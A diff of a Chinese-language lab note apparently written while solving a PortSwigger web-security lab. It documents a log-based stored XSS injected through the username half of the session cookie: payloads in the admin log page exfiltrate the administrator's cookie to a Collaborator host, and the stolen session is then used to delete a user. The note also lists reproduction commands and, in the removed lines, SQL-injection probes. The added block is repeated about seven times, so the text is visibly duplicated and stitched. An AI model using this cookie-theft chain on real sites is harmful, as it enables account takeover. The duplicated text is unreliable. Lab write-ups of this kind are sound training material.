@@ -4,47 +4,182 @@ title: lab-scanning-non-standard-data-structures
 
 # lab-scanning-non-standard-data-structures
 
-> evidences: [[web-vuln-methods]]
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
 
-- 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。
-- 实例(批51):https://0a4f000003d659d386b6de6b00110042.web-security-academy.net
-- 判定:**stuck**(cookie 两半的解析/定位语义已量化死;真正可注入的非标准结构仍未找到)
+## 机制:日志型存储 XSS(不是反射型)
 
-## 应用面(blog 克隆)
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
 
-`/`、`/post?postId=N`、`POST /post/comment`(csrf/postId/comment/name/email/website,全部 HTML 转义)、`/login`(hidden csrf)、`/my-account`(显示 `Your username is: X`)、`/my-account/change-email`(email + csrf)、`/admin`(401)、`/logout`,`/resources/static/*`。
+## 会话语义(逐字节刚性)
 
-## 会话 cookie = 唯一"非标准结构":`<username>%3a<32 位 base62 token>`
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
 
-批51 把它的语义钉死(纠正批50 的判读):
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
 
-1. **500 的成因是"两半不匹配",不是"用户名未知"**:身份由 **token** 决定,app 要求 cookie 里的 username 与该 token 对应用户**相等**,不等即 500。故**任何** username 半的改动(含 `wiener' OR '1'='1`、`%27%20OR%201=1--%20-`、`wiener' UNION SELECT 1,2,3,4,5,6,7,8-- -`、`wiener'-- -`、``wiener'' OR ''1''=''1``)都是同一个 500(digest aa136edf6af38e3e)——这些读数**不能**当作"用户名不可注入"的证据,它们全被 mismatch 掩盖。
-2. **username 半不可注入**(与上条独立):注入形状与真值形状给出同一个 500 类,没有 SQL 错误类可分。
-3. **token 半是精确匹配**:`<tok>' OR '1'='1` / `' OR 1=1-- -` -> /admin 401、/my-account 302(未登录);token 截断 8 位、大写化 -> 302 ⇒ 无前缀/大小写宽容。
-4. **重复 session cookie:后一个生效**(`session=administrator:<tok>; session=wiener:<tok>` -> 200 正常 wiener 会话;反序 -> 500),无 split-brain。
-5. **cookie 里塞第三个冒号**(`wiener%3a<tok>%3aadministrator`)-> 401(= 未登录),无越权。
-6. **无规范形窗口**(批52 证伪):token 保持不变、username 半逐变形——原样/编码空格(`wiener `、`%20`、`+`)、原样/编码制表(`\t`、`%09`)、`%0b`、大小写(`WIENER`/`Wiener`)、前导空格、`wiener--`、`wiener%00`——**全部** 500 且 digest 全同(aa136edf6af38e3e);token 半尾随空格/大写/截尾 -> 302 ⇒ 两半比对都是**逐字节精确**,既无 trim 也无大小写/注释容忍,不存在「比对用规范形、SQL 见原始串」的入口。
+## 实例寿命坑
 
-## 其余插入点
-
-- `/my-account/change-email` 首次被扫:10 值(sqli/ssti/cmdi/crlf/xss/path)全 302(Location `/my-account?id=wiener`)无差分 —— 该槽只存不判。
-- `/admin/delete?username=carlos` 直接带 wiener 会话 -> 401,动作端点也过角色门。
-- cookie 的 CRLF 面(批50 四腿:原样 200、username 内 `%0d%0a` 500、裸 CRLF 302+新匿名 cookie、token 尾 `%0d%0a` 302)仍判**关闭**。
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
 
 ## 复现命令
 
-```
-http_session get <inst>/login --jar j          # csrf + 匿名 cookie 形:`:<32位>`
-http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j
-raw_matrix @cookie-battery.json   # username/token 两半的注入矩阵(见上四类判读)
-form_sweep <inst>/my-account/change-email email 'x@x.com,…,x@x.com|id' --field csrf=… --jar j   # 只存不判,全 302
-```
-
-## 表面巡面增量
-
-- 以 `wiener:peter` 登录后 `/my-account?id=wiener` 只有 change-email 表单(无内联脚本);会话 cookie 仍是 `<username>%3a<32 位 token>`(匿名 `%3a<token>`、登录后 `wiener%3am0J9…`)。除 cookie 外无其它「非标准结构」承载面(评论 name/website/email 全转义)。
-- `dbg_cli net scan` 电池本批未落地(需先 attach + net intercept 捕模板)。
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
 
 ## 关系
 
-- 族:[[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状见 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+
+# lab-scanning-non-standard-data-structures
+
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
+
+## 机制:日志型存储 XSS(不是反射型)
+
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
+
+## 会话语义(逐字节刚性)
+
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
+
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
+
+## 实例寿命坑
+
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
+
+## 复现命令
+
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
+
+## 关系
+
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+
+# lab-scanning-non-standard-data-structures
+
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
+
+## 机制:日志型存储 XSS(不是反射型)
+
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
+
+## 会话语义(逐字节刚性)
+
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
+
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
+
+## 实例寿命坑
+
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
+
+## 复现命令
+
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
+
+## 关系
+
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+
+# lab-scanning-non-standard-data-structures
+
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
+
+## 机制:日志型存储 XSS(不是反射型)
+
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
+
+## 会话语义(逐字节刚性)
+
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
+
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
+
+## 实例寿命坑
+
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
+
+## 复现命令
+
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
+
+## 关系
+
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+
+# lab-scanning-non-standard-data-structures
+
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
+
+## 机制:日志型存储 XSS(不是反射型)
+
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
+
+## 会话语义(逐字节刚性)
+
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
+
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
+
+## 实例寿命坑
+
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
+
+## 复现命令
+
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
+
+## 关系
+
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+
+# lab-scanning-non-standard-data-structures
+
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
+
+## 机制:日志型存储 XSS(不是反射型)
+
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
+
+## 会话语义(逐字节刚性)
+
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
+
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
+
+## 实例寿命坑
+
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
+
+## 复现命令
+
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
+
+## 关系
+
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
+
+# lab-scanning-non-standard-data-structures
+
+> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。
+
+## 机制:日志型存储 XSS(不是反射型)
+
+"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。
+
+## 会话语义(逐字节刚性)
+
+`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。
+
+- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。
+
+## 实例寿命坑
+
+lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。
+
+## 复现命令
+
+`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`
+
+## 关系
+
+族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
